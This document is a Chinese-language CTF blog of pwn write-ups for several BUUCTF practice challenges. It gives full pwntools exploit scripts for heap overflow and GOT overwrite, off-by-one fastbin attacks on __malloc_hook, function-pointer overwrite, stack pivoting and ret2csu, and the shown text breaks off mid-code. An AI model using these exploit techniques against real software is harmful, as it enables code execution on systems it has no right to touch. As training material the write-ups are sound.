---
title: buu—_summer
date: 2021-07-12 23:34:08
tags:
---

# 7月12日

## 1.babyfengshui_33c3_2016

题目类型：堆溢出泄露libc以及修改got表指向get shell

main函数

常规菜单没什么好看的

```C
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h] BYREF
  int v1; // [esp+4h] [ebp-14h] BYREF
  int v2[4]; // [esp+8h] [ebp-10h] BYREF

  v2[1] = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", v2, &v0);
      add(v2[0]);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      dele(LOBYTE(v2[0]));
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      show(v2[0]);
    }
    if ( v1 == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      edit(LOBYTE(v2[0]));
    }
    if ( v1 == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( (unsigned __int8)byte_804B069 > 0x31u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

ADD函数里面一开始创建了个堆，堆的大小由主函数菜单确定

接着开了个新的v3固定大小0x80指向s

然后进入80486BB函数输入name值

```C
_DWORD *__cdecl add(size_t a1)
{
  void *s; // [esp+14h] [ebp-14h]
  _DWORD *v3; // [esp+18h] [ebp-10h]

  s = malloc(a1);
  memset(s, 0, a1);
  v3 = malloc(0x80u);
  memset(v3, 0, 0x80u);
  *v3 = s;
  *(&ptr + (unsigned __int8)byte_804B069) = v3;
  printf("name: ");
  sub_80486BB((char *)*(&ptr + (unsigned __int8)byte_804B069) + 4, 124);
  edit((unsigned __int8)byte_804B069++);
  return v3;
}
```





edit函数

v3是我们输入的大小

(char *)(v3 + *(_DWORD *)*(&ptr + a1)) >= (char *)*(&ptr + a1) - 4

这句语句限制了我们的输入长度

他检查的范围是以description堆块的起始地址和name的起始地址之间的长度。

我们绕过的方法可以构造unsortedbin区块

因为我们在ADD函数可以得知add一个new chunk

实际上new了2个chunk

一个是name 另外一个就是text(在add中调用edit函数进行填充)

我们构造同等大小的chunk，如下代码操作

```Python
add(80,80,"H.R.P")
add(80,80,"H.R.P")
add(80,80,"/bin/sh\x00")
```

现在一共有6个chunk

我们释放0号chunk 可以得到一个0x100的chunk(0x80+0x80)

这个chunk在unsortedbin

下面我们再new一个chunk 这个chunk就会成为新的0号chunk

chunk大小设置为0x100从unsortedbin中提取出来不足的部分就会在最下面新开

这样就绕过了检测

![1](https://user-images.githubusercontent.com/72968793/125313079-79d3ea80-e367-11eb-9ad0-c982366468a8.png)

text大小为0x19c，0x110(这里有0x10是chunk本身结构体会占用的实际可用大小为0x100但是我们填充是从头+8开始填的所以是0x110)

+0x80(chunk 1)+0x8填充弥补头的prve_size +0x4 free的got地址

填充好后如下

0x89bd1a0:	0x006e69000804b010	0x0000000000000000

这就是1号chunk指向chunk0的指针改掉他成free的got

```shell
pwndbg> x/128gx 0x89bd000
0x89bd000:	0x0000011100000000	0x6161616161616161
0x89bd010:	0x6161616161616161	0x6161616161616161
0x89bd020:	0x6161616161616161	0x6161616161616161
0x89bd030:	0x6161616161616161	0x6161616161616161
0x89bd040:	0x6161616161616161	0x6161616161616161
0x89bd050:	0x6161616161616161	0x6161616161616161
0x89bd060:	0x6161616161616161	0x6161616161616161
0x89bd070:	0x6161616161616161	0x6161616161616161
0x89bd080:	0x6161616161616161	0x6161616161616161
0x89bd090:	0x6161616161616161	0x6161616161616161
0x89bd0a0:	0x6161616161616161	0x6161616161616161
0x89bd0b0:	0x6161616161616161	0x6161616161616161
0x89bd0c0:	0x6161616161616161	0x6161616161616161
0x89bd0d0:	0x6161616161616161	0x6161616161616161
0x89bd0e0:	0x6161616161616161	0x6161616161616161
0x89bd0f0:	0x6161616161616161	0x6161616161616161
0x89bd100:	0x6161616161616161	0x6161616161616161
0x89bd110:	0x6161616161616161	0x6161616161616161
0x89bd120:	0x6161616161616161	0x6161616161616161
0x89bd130:	0x6161616161616161	0x6161616161616161
0x89bd140:	0x6161616161616161	0x6161616161616161
0x89bd150:	0x6161616161616161	0x6161616161616161
0x89bd160:	0x6161616161616161	0x6161616161616161
0x89bd170:	0x6161616161616161	0x6161616161616161
0x89bd180:	0x6161616161616161	0x6161616161616161
0x89bd190:	0x6161616161616161	0x6161616161616161
0x89bd1a0:	0x006e69000804b010	0x0000000000000000

```

## 补充

这个是这个32位程序正常的堆

0x804c080:	0x0000000000000000	0x0000008800000088

后面那个88 是这个堆的大小

一直从0x804c080到0x804c100

第二个堆的大小标志位在0x804c110:	0x0000008800000110

后面的110是前面的堆的大小（这里面我把前面那个chunk释放了

因为这个题目的关系0x80+0x80=0x100加上chunk本身占用的标志位

=0x110）

0x804c090:	0x2e522e480804c008	0x0000000000000050

这部分0x2e522e480804c008中的804c008指的是上一个chunk

所以我们回过去看我们上面修改的部分

0x89bd1a0:	0x006e69000804b010	0x0000000000000000

这里我们修改的就是chunk1的前驱指针

这样看是不是就好理解了呢？

（把堆当结构体看事半功倍，做题前好好分析chunk的结构）

```shell
0x804c080:	0x0000000000000000	0x0000008800000088
0x804c090:	0x2e522e480804c008	0x0000000000000050
0x804c0a0:	0x0000000000000000	0x0000000000000000
0x804c0b0:	0x0000000000000000	0x0000000000000000
0x804c0c0:	0x0000000000000000	0x0000000000000000
0x804c0d0:	0x0000000000000000	0x0000000000000000
0x804c0e0:	0x0000000000000000	0x0000000000000000
0x804c0f0:	0x0000000000000000	0x0000000000000000
0x804c100:	0x0000000000000000	0x0000000000000000
0x804c110:	0x0000008800000110	0x0000502e522e4848
0x804c120:	0x0000000000000000	0x0000000000000000
0x804c130:	0x0000000000000000	0x0000000000000000
0x804c140:	0x0000000000000000	0x0000000000000000
0x804c150:	0x0000000000000000	0x0000000000000000
0x804c160:	0x0000000000000000	0x0000000000000000
0x804c170:	0x0000000000000000	0x0000000000000000
0x804c180:	0x0000000000000000	0x0000000000000000
0x804c190:	0x0000000000000000	0x0000008900000000

```





```c
unsigned int __cdecl edit(unsigned __int8 a1)
{
  char v2; // [esp+17h] [ebp-11h] BYREF
  int v3; // [esp+18h] [ebp-10h] BYREF
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && *(&ptr + a1) )
  {
    v3 = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &v3, &v2);
    if ( (char *)(v3 + *(_DWORD *)*(&ptr + a1)) >= (char *)*(&ptr + a1) - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text: ");
    get(*(char **)*(&ptr + a1), v3 + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```



此时我们再去show chunk1的时候就会print出libc

用libcsearcher可以得到system的real addr

利用edit功能改写free got表为system

相当于执行free的时候执行system了

那么我们之前chunk 2写入了/bin/sh

此时我们再去free chunk2

就可以直接get shell了

exp如下

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

p = process('./babychunk')
#p = remote('node4.buuoj.cn', 28956)
elf = ELF('babychunk')

def Add(size, length, text):
	p.sendlineafter("Action: ", '0')
	p.sendlineafter("description: ", str(size))
	p.sendlineafter("name: ", 'qin')
	p.sendlineafter("length: ", str(length))
	p.sendlineafter("text: ", text)

def Del(index):
	p.sendlineafter("Action: ", '1')
	p.sendlineafter("index: ", str(index))

def Dis(index):
	p.sendlineafter("Action: ", '2')
	p.sendlineafter("index: ", str(index))

def Upd(index, length, text):
	p.sendlineafter("Action: ", '3')
	p.sendlineafter("index: ", str(index))
	p.sendlineafter("length: ", str(length))
	p.sendlineafter("text: ", text)


Add(0x80, 0x80, 'H.R.P')
Add(0x80, 0x80, 'H.R.P')
Add(0x8, 0x8, '/bin/sh\x00')
Del(0)

Add(0x100, 0x19c, "a"*0x198+p32(elf.got['free']))
gdb.attach(p)
print(len(p32(elf.got['free'])))

Dis(1)

p.recvuntil("description: ")
free_addr = u32(p.recv(4))
print(hex(free_addr))

libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
sys_addr = libc_base + libc.dump('system')

Upd(1, 0x4, p32(sys_addr))
Del(2)

p.interactive()

```

## 2.[ZJCTF 2019]Login

一道涨姿势的题目

将指针当函数执行

经过整理后得的的main

bug在bug函数

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (*v3)(void); // rax
  const char *v4; // rbx
  const char *v5; // rax
  void (**v7)(void); // [rsp+10h] [rbp-130h] BYREF
  char v8[176]; // [rsp+20h] [rbp-120h] BYREF
  char v9[16]; // [rsp+D0h] [rbp-70h] BYREF
  char v10[64]; // [rsp+E0h] [rbp-60h] BYREF
  unsigned __int64 v11; // [rsp+128h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  strcpy(v9, "2jctf_pa5sw0rd");
  memset(v10, 0, sizeof(v10));
  Admin::Admin((Admin *)v8, "admin", v9);
  puts(
    " _____   _  ____ _____ _____   _                _       \n"
    "|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n"
    "  / /_  | | |     | | | |_    | |   / _ \\ / _` | | '_ \\ \n"
    " / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n"
    "/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n"
    "                                          |___/         ");
  printf("Please enter username: ");
  User::read_name((User *)&login);
  printf("Please enter password: ");
  v3 = (void (*)(void))main::{lambda(void)#1}::operator void (*)(void)();
  v7 = (void (**)(void))check(v3);
  User::read_password((User *)&login);
  v4 = (const char *)User::get_password((User *)v8);
  v5 = (const char *)User::get_password((User *)&login);
  bug(&v7, v5, v4);
  return 0;
}
```

bug

(**a1)();这部分代码将\*a1当做函数来执行

a1来着main的v7

v7来自check的返回值

因为read函数和check函数都在main函数

他们的变量实际上在同一栈上

只要在read函数覆盖到check函数返回值的地方更改其为后门函数

就可以得到权限了

```
unsigned __int64 __fastcall bug(void (***a1)(void), const char *a2, const char *a3)
{
  char s[88]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+78h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( !strcmp(a2, a3) )
  {
    snprintf(s, 0x50uLL, "Password accepted: %s\n", s);
    puts(s);
    (**a1)();
  }
  else
  {
    puts("Nope!");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

exp

```
from pwn import *
p = remote('node4.buuoj.cn',25653)                          
payload = '2jctf_pa5sw0rd'.ljust(0x48, '\x00') + p64(0x400e88)
p.sendlineafter('username: ', 'admin')
p.sendafter('password: ', payload)
p.interactive()


```

# 7月14日

### 1.roarctf_2019_easy_pwn（off-by-one）

main

```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch]

  sub_AD0(a1, a2, a3);
  while ( 1 )
  {
    menu();
    v4 = choice(v4);
    switch ( v4 )
    {
      case 1u:
        add();
        break;
      case 2u:
        puts("Tell me the secret about you!!");
        edit();
        break;
      case 3u:
        dele();
        break;
      case 4u:
        show();
        break;
      case 5u:
        return 0LL;
      default:
        puts("Wrong try again!!");
        break;
    }
  }
}
```

漏洞存在于edit中的BUG函数

BUG

当修改的大小比原来大10，就可以多输入1个字节

造成了off by one，由此我们可以构造堆重叠泄露libc以及

造成fastbin攻击写入onegadget

```C
__int64 __fastcall BUG(int a1, unsigned int a2)
{
  __int64 result; // rax

  if ( a1 > (int)a2 )
    return a2;
  if ( a2 - a1 == 10 )
    LODWORD(result) = a1 + 1;                   // 如果修改大小比申请堆大10就可以多输入一个字节
  else
    LODWORD(result) = a1;
  return (unsigned int)result;
}
```

堆重叠构造

```python
add(0x18)#0
add(0x10)#1
add(0x90)#2
add(0x10)#3
```

先add3个chunk。3号chunk隔开topchunk

目前正常的chunk就长这样

在0x5565289df000:	0x0000000000000000	0x0000000000000021

后面的是chunk size 

1是size insure 0表示前面的chunk被释放 1表示在利用

前面一堆0是表示prve_size（前面chunk的大小）

0x5565289df010:	0x0000000000000000	0x0000000000000000

在64位中，chunk size下面的0x10大小的分别是fd bk指针的位置

```python
pwndbg> x/128gx 0x5565289df000
0x5565289df000:	0x0000000000000000	0x0000000000000021
0x5565289df010:	0x0000000000000000	0x0000000000000000
0x5565289df020:	0x0000000000000000	0x0000000000000021
0x5565289df030:	0x0000000000000000	0x0000000000000000
0x5565289df040:	0x0000000000000000	0x00000000000000a1
0x5565289df050:	0x0000000000000000	0x0000000000000000
0x5565289df060:	0x0000000000000000	0x0000000000000000
0x5565289df070:	0x0000000000000000	0x0000000000000000
0x5565289df080:	0x0000000000000000	0x0000000000000000
0x5565289df090:	0x0000000000000000	0x0000000000000000
0x5565289df0a0:	0x0000000000000000	0x0000000000000000
0x5565289df0b0:	0x0000000000000000	0x0000000000000000
0x5565289df0c0:	0x0000000000000000	0x0000000000000000
0x5565289df0d0:	0x0000000000000000	0x0000000000000000
0x5565289df0e0:	0x0000000000000000	0x0000000000000021
0x5565289df0f0:	0x0000000000000000	0x0000000000000000
0x5565289df100:	0x0000000000000000	0x0000000000020f01
```

现在我们修改chunk0把chunk0呢填满

然后下面跟着的chunk1我们把它大小改为0xa1

他的prve_size改为0x20

edit(0,34,'a'*0x10+p64(0x20)+p8(0xa1))

修改成功就这样，但是过不了检测的

chunk1此时被改成了0xa0大小

但是chunk2他这显示你不是

所以啊过不了检测

我们还要对chunk2做手脚

```C
pwndbg> x/128gx 0x55e6c276f000
0x55e6c276f000:	0x0000000000000000	0x0000000000000021
0x55e6c276f010:	0x6161616161616161	0x6161616161616161
0x55e6c276f020:	0x0000000000000020	0x00000000000000a1
0x55e6c276f030:	0x0000000000000000	0x0000000000000000
0x55e6c276f040:	0x0000000000000000	0x00000000000000a1

```

我们不难发现chunk2起始地在0x40

但是内容是在0x55e6c276f050开始写入

我们要满足0x55e6c276f020开始的chunk1大小为0xa0

可得我们要在0x55e6c276f0c0的地方的修改chunk2的prve_size为0xa0

自己的chunk size为0x21

如下代码

```C
pwndbg> x/32gx 0x558e09943000
0x558e09943000:	0x0000000000000000	0x0000000000000021
0x558e09943010:	0x6161616161616161	0x6161616161616161
0x558e09943020:	0x0000000000000020	0x00000000000000a1
0x558e09943030:	0x0000000000000000	0x0000000000000000
0x558e09943040:	0x0000000000000000	0x00000000000000a1
0x558e09943050:	0x0000000000000000	0x0000000000000000
0x558e09943060:	0x0000000000000000	0x0000000000000000
0x558e09943070:	0x0000000000000000	0x0000000000000000
0x558e09943080:	0x0000000000000000	0x0000000000000000
0x558e09943090:	0x0000000000000000	0x0000000000000000
0x558e099430a0:	0x0000000000000000	0x0000000000000000
0x558e099430b0:	0x0000000000000000	0x0000000000000000
0x558e099430c0:	0x00000000000000a0	0x0000000000000021
0x558e099430d0:	0x0000000000000000	0x0000000000000000

```

下面我们构造堆重叠

我们都知道bin的管理模式是当要创建新的chunk优先从空闲空间拿

不够再和top chunk 拿

我们dele1再把它用同等大小申请回来就会造成和chunk2有重叠

我们先看看dele1的情况

很明显他的fd bk指针指向main_arean+88

我们可以顺便看看他 的内存情况

是不是和我们上面说的一样

chunk开始的下面0x10地方存放fd bk

```C
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55d4dd2c5000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55d4dd2c5020
Size: 0xa1
fd: 0x7f2fff3fab78
bk: 0x7f2fff3fab78

Allocated chunk
Addr: 0x55d4dd2c50c0
Size: 0x20

Allocated chunk | PREV_INUSE
Addr: 0x55d4dd2c50e0
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x55d4dd2c5100
Size: 0x20f01

```

结果显然是一致的

```C
pwndbg> x/32gx 0x55d4dd2c5020
0x55d4dd2c5020:	0x0000000000000020	0x00000000000000a1
0x55d4dd2c5030:	0x00007f2fff3fab78	0x00007f2fff3fab78
0x55d4dd2c5040:	0x0000000000000000	0x00000000000000a1
0x55d4dd2c5050:	0x0000000000000000	0x0000000000000000
0x55d4dd2c5060:	0x0000000000000000	0x0000000000000000
0x55d4dd2c5070:	0x0000000000000000	0x0000000000000000
0x55d4dd2c5080:	0x0000000000000000	0x0000000000000000
0x55d4dd2c5090:	0x0000000000000000	0x0000000000000000
0x55d4dd2c50a0:	0x0000000000000000	0x0000000000000000
0x55d4dd2c50b0:	0x0000000000000000	0x0000000000000000
0x55d4dd2c50c0:	0x00000000000000a0	0x0000000000000020
0x55d4dd2c50d0:	0x0000000000000000	0x0000000000000000
0x55d4dd2c50e0:	0x0000000000000000	0x0000000000000021
0x55d4dd2c50f0:	0x0000000000000000	0x0000000000000000

```

现在我们把他申请回来

add(0x90)

结合原来数据可以知道

在0x040那个地方开始是chunk2

chunk1在0x020

现在就有了重叠部分

我们还要改下chunk1去写入chunk2的大小

```c
pwndbg> x/32gx 0x5636130a7000
0x5636130a7000:	0x0000000000000000	0x0000000000000021
0x5636130a7010:	0x6161616161616161	0x6161616161616161
0x5636130a7020:	0x0000000000000020	0x00000000000000a1
0x5636130a7030:	0x0000000000000000	0x0000000000000000
0x5636130a7040:	0x0000000000000000	0x0000000000000000
0x5636130a7050:	0x0000000000000000	0x0000000000000000
0x5636130a7060:	0x0000000000000000	0x0000000000000000
0x5636130a7070:	0x0000000000000000	0x0000000000000000
0x5636130a7080:	0x0000000000000000	0x0000000000000000
0x5636130a7090:	0x0000000000000000	0x0000000000000000
0x5636130a70a0:	0x0000000000000000	0x0000000000000000
0x5636130a70b0:	0x0000000000000000	0x0000000000000000
0x5636130a70c0:	0x0000000000000000	0x0000000000000021
0x5636130a70d0:	0x0000000000000000	0x0000000000000000
0x5636130a70e0:	0x0000000000000000	0x0000000000000021
0x5636130a70f0:	0x0000000000000000	0x0000000000000000

```

edit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))

现在就很清楚了chunk1和chunk2重合部分

从0x040到0x0b0

```c
pwndbg> x/32gx 0x557b9da9d000
0x557b9da9d000:	0x0000000000000000	0x0000000000000021
0x557b9da9d010:	0x6161616161616161	0x6161616161616161
0x557b9da9d020:	0x0000000000000020	0x00000000000000a1
0x557b9da9d030:	0x0000000000000000	0x0000000000000000
0x557b9da9d040:	0x0000000000000000	0x00000000000000a1
0x557b9da9d050:	0x0000000000000000	0x0000000000000000
0x557b9da9d060:	0x0000000000000000	0x0000000000000000
0x557b9da9d070:	0x0000000000000000	0x0000000000000000
0x557b9da9d080:	0x0000000000000000	0x0000000000000000
0x557b9da9d090:	0x0000000000000000	0x0000000000000000
0x557b9da9d0a0:	0x0000000000000000	0x0000000000000000
0x557b9da9d0b0:	0x0000000000000000	0x0000000000000000
0x557b9da9d0c0:	0x0000000000000000	0x0000000000000021
0x557b9da9d0d0:	0x0000000000000000	0x0000000000000000
0x557b9da9d0e0:	0x0000000000000000	0x0000000000000021
0x557b9da9d0f0:	0x0000000000000000	0x0000000000000000

```

这个时候我们dele chunk2 chunk2就会进入unsortedbin

然后他的fd bk又指向了main_arena+88

此时他包含在chunk1那么我们把chunk1 打印出来就自然而然的

得到了libc

我们先看看dele chunk2的样子

里面已经包含了

0x560348732050:	0x00007f414af4fb78	0x00007f414af4fb78

nice

```
pwndbg> x/64gx 0x560348732000
0x560348732000:	0x0000000000000000	0x0000000000000021
0x560348732010:	0x6161616161616161	0x6161616161616161
0x560348732020:	0x0000000000000020	0x00000000000000a1
0x560348732030:	0x0000000000000000	0x0000000000000000
0x560348732040:	0x0000000000000000	0x00000000000000a1
0x560348732050:	0x00007f414af4fb78	0x00007f414af4fb78
0x560348732060:	0x0000000000000000	0x0000000000000000
0x560348732070:	0x0000000000000000	0x0000000000000000
0x560348732080:	0x0000000000000000	0x0000000000000000
0x560348732090:	0x0000000000000000	0x0000000000000000
0x5603487320a0:	0x0000000000000000	0x0000000000000000
0x5603487320b0:	0x0000000000000000	0x0000000000000000
0x5603487320c0:	0x0000000000000000	0x0000000000000021
0x5603487320d0:	0x0000000000000000	0x0000000000000000
0x5603487320e0:	0x00000000000000a0	0x0000000000000020
0x5603487320f0:	0x0000000000000000	0x0000000000000000
0x560348732100:	0x0000000000000000	0x0000000000020f01

```

当我们show chunk1可以完美接受到libc

### 偏移寻找

从gdb调试可以知道我们泄露的是main_arena+88

我们可以p main_arena+88得到地址

输入libc

用main_arena+88-libc得到偏移





注意写脚本的时候记得接受0x20大小的junk code

下面的代码块里可以看出的

```shell
[DEBUG] Received 0xf6 bytes:
    00000000  63 6f 6e 74  65 6e 74 3a  20 00 00 00  00 00 00 00  │cont│ent:│ ···│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00 a1 00 00  00 00 00 00  00 78 0b 02  a4 3a 7f 00  │····│····│·x··│·:··│
    00000030  00 78 0b 02  a4 3a 7f 00  00 00 00 00  00 00 00 00  │·x··│·:··│····│····│

```

下面我们就要进行构造fastbin造成任意写了

我们先申请个chunk2

add(0x80)

和之前构造堆重叠一个道理不过这次我们要的是fastbin的chunk

edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))

上面的edit是对chunk1编写改出个chunk2的大小来

不难发现chunk2又被包含在了chunk1中

```c
pwndbg> x/32gx 0x556b562fd000
0x556b562fd000:	0x0000000000000000	0x0000000000000021
0x556b562fd010:	0x6161616161616161	0x6161616161616161
0x556b562fd020:	0x0000000000000020	0x00000000000000a1
0x556b562fd030:	0x0000000000000000	0x0000000000000000
0x556b562fd040:	0x0000000000000000	0x0000000000000071
0x556b562fd050:	0x0000000000000000	0x0000000000000000
0x556b562fd060:	0x0000000000000000	0x0000000000000000
0x556b562fd070:	0x0000000000000000	0x0000000000000000
0x556b562fd080:	0x0000000000000000	0x0000000000000000
0x556b562fd090:	0x0000000000000000	0x0000000000000000
0x556b562fd0a0:	0x0000000000000000	0x0000000000000000
0x556b562fd0b0:	0x0000000000000070	0x0000000000000021
0x556b562fd0c0:	0x0000000000000000	0x0000000000000000
0x556b562fd0d0:	0x0000000000000000	0x0000000000000000
0x556b562fd0e0:	0x0000000000000000	0x0000000000000021
0x556b562fd0f0:	0x0000000000000000	0x0000000000000000

```

此时我们去dele chunk2

他就进入了fastbin区块

然后往里面写入任意写的函数地址

我们可以看看他的fd bk指向哪里了

edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x560da9fda040 —▸ 0x7f8c8e03eaed (_IO_wide_data_0+301) ◂— 0x8c8dcffea0000000
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

```

指向了的确是在任意写的地方

我们此时可以往里面写onegadget了此时还需要用realloc压栈

x/32gx realloc_hook

这样看 push 压栈 压入寄存器的都可以

```
Undefined command: "0x7ffff7dd1b78".  Try "help".
pwndbg> x/32gi __realloc_hook
   0x7ffff7a92a70 <realloc_hook_ini>:	push   r15
   0x7ffff7a92a72 <realloc_hook_ini+2>:	push   r14
   0x7ffff7a92a74 <realloc_hook_ini+4>:	push   r13
   0x7ffff7a92a76 <realloc_hook_ini+6>:	push   r12

```

### bin大小范围

fastbin大小范围0x20~0x80

largebin大于等于1024字节（0x400）的chunk称之为large chunk

smallbin小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的。

unsortedbin当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中

exp

```python
from pwn import *
#from LibcSearcher import *
#r=remote('node4.buuoj.cn',27823)
r=process('chunk1')
libc=ELF('./libc-2.23.so')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level="debug"

def add(size):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.recvuntil('size:')
    r.sendline(str(size))

def edit(index,size,data):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.recvuntil('index:')
    r.sendline(str(index))
    r.recvuntil('size:')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.send(data)
 
def delete(index):
    r.recvuntil('choice: ')
    r.sendline('3')
    r.recvuntil('index:')
    r.sendline(str(index))
 
def show(index):
    r.recvuntil('choice: ')
    r.sendline('4')
    r.recvuntil('index:')
    r.sendline(str(index))

add(0x18)
add(0x10)
add(0x90)
add(0x10)
#gdb.attach(r)
malloc_hook=libc.symbols['__malloc_hook']
realloc_hook=libc.symbols['realloc']

edit(0,34,'a'*0x10+p64(0x20)+p8(0xa1))
edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))
delete(1)

add(0x90)

edit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))

delete(2)

show(1)
r.recvuntil("content: ")
r.recv(0x20)
libc_base=u64(r.recv(6).ljust(8,"\x00"))-0x3c4b78
print(hex(libc_base))
add(0x80)

edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))

delete(2)
edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)

one_gadgets=[0x45216,0x4526a,0xf1147,0xf02a4]
add(0x60)#2

add(0x60)#4
gdb.attach(r)
edit(4,27,'a'*11+p64(libc_base+one_gadgets[2])+p64(libc_base+realloc_hook+4)) 
gdb.attach(r)
#add(0x10)
add(0x60)#5
r.interactive()
```

# 7月15日

## 1.栈迁移

### gyctf_2020_borrowstack

main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[96]; // [rsp+0h] [rbp-60h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts(&s);
  read(0, buf, 0x70uLL);
  puts("Done!You can check and use your borrow stack now!");
  read(0, &bank, 0x100uLL);
  return 0;
}
```

我们在main不难发现栈溢出

但是很明显溢出长度不是很充足

只有0x10的长度 我们发现下面可以读取的大一点去康康是什么东西嗷

┗|｀O′|┛ 嗷~~





.bss:0000000000601080 bank   

不难发现是bss段落



我们可以构造rop链存放于bss段落

当我们利用函数栈修改的修改rsp

让栈指针指向bss段落，去执行我们的rop



第一步的payload

```shell
'a'*变量的offset+p64(bss_addr)+p64(leave)


```

leave指令是为了控制bq和sp寄存器

正常来说我们填充2次leave

但是程序执行是会自己含有一个leave



在bss段落的rop的这样写

p64(ret)*20+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(main)

p64(ret)*20用来抬栈避免触碰到got表导致程序崩溃

然后接受泄露的libc

leak=u64(r.recv(6).ljust(8,'\x00'))

然后自己去差base吧



最后再传入onegadget就可以getshell了

soeasy



exp:

```python
from pwn import *

io=remote('node.buuoj.cn','28257')

bank=0x0601080
leave=0x400699
puts_plt=0x04004E0
puts_got=0x0601018
pop_rdi=0x400703
main=0x0400626
ret=0x400704

io.recvuntil('u want')
pl1='a'*0x60+p64(bank)+p64(leave)
io.send(pl1)
io.recvuntil('now!')
pl2=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(pl2)
io.recvline()
puts_add=u64(io.recv(6).ljust(8,'\x00'))
libc_base=puts_add-0x06f690
one_gadget=libc_base+0x4526a
pl3='a'*0x60+'bbbbbbbb'+p64(one_gadget)
io.send(pl3)
io.send('a')

io.interactive()
```

## 2.csu+栈迁移

题目和exp

链接：https://pan.baidu.com/s/1tNgz_5tcXkwfLNpvAdIEXQ 
提取码：4567 
--来自百度网盘超级会员V2的分享

main函数

同样是栈迁移很明显的

但是你迁移的长度太少了吧啊哈

我们就要经典用csu达成目的咯

那就要想办法执行构造可以利用的东西

这个题目给了sys_read非常明显嘛

送我们sys，而且main函数也说了syscall(59)#系统调用号不知道的自己去百度哦

相当于调用execve

我们构造个execve(0x3b)

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init();
  puts("input your name,user\n");
  read(0, name, 0x58uLL);
  printf("hi %s\n", name);
  puts("have you ever heard about _syscall_?");
  puts("$rax matters a lot when it comes to _syscall_,ril_,right?");
  puts("for example,syscall(0x3b,...) equals execve(...)");
  puts("but i haven't figured out how they matched in detail ,so can you tell something about it?");
  return read(0, buf, 0x40uLL);
}
```

bss段是最好的布局区段

我们在里面构造就好呀

上csu模板！！

```python
def ret_csu(r12, r13, r14, r15, last):
	payload = offset * 'a'  
	#构造栈溢出的padding
	payload += p64(first_csu) + 'a' * 8    
	#gadgets1的地址
	payload += p64(0) + p64(1)
	#rbx=0, rbp=1
	payload += p64(r12)
	#call调用的地址
	payload += p64(r13) + p64(r14) + p64(r15)
	#三个参数的寄存器
	payload += p64(second_csu)
	#gadgets2的地址
	payload += 'a' * 56
	#pop出的padding
	payload += p64(last)
	#函数最后的返回地址
	return payload

```

对于csu模板的使用要分清情况

这里的话因为我们是要去调用execve而不是让他执行完毕

所以末尾的'a'*56可以删除

还有在fist_csu后面也不能加'a'*8

## 3.典型csu

题目和exp

链接：https://pan.baidu.com/s/18tRF62mbYF6ba_hBD5vWVA 
提取码：4567 
--来自百度网盘超级会员V2的分享

main函数

我们可以去用基础rop没问题但是这个例题只是为了更好的讲解csu的运用

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

